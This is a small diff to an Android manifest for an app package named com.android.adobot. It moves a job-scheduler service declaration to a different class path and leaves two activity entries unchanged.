@@ -70,7 +70,7 @@
         <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
         <activity android:name="com.android.adobot.activities.PermissionsActivity"></activity>
 
-        <service android:name="com.android.adobot.network.NetworkSchedulerService"
+        <service android:name="com.android.adobot.NetworkSchedulerService"
             android:exported="true"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
